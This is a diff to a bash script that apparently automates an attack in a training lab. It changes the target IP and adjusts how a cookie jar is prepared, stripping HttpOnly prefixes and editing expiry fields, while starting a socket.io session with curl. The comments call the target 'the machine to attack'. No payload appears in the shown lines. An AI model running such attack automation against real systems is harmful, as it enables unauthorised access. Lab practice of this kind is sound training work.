@@ -5,7 +5,7 @@ script=$(readlink -f $0)
 scriptpath=`dirname $script`
 
 # Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
-target_ip="10.10.247.176"
+target_ip="10.10.216.153"
 attack_ip="10.9.5.12"
 result_folder="/work/results/"
 
@@ -18,8 +18,10 @@ curl -s -X GET "http://$target_ip" -L > /dev/null
 curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/3-cookies.txt" -L
 IO=$(grep io "$result_folder/3-cookies.txt" | awk '{print $7}')
 echo "--> Session initiated with cookie IO ${IO}"
-echo -e "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/3-cookies.txt
-echo -e "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/3-cookies.txt
+sed -i 's/#HttpOnly_//g' "$result_folder/3-cookies.txt"
+sed -i 's/\t0\t/\t-1\t/g' "$result_folder/3-cookies.txt"
+echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tlanguage\ten" >> $result_folder/3-cookies.txt
+echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tcookieconsent_status\tdismiss" >> $result_folder/3-cookies.txt
 
 
 # Give a feedback as another user
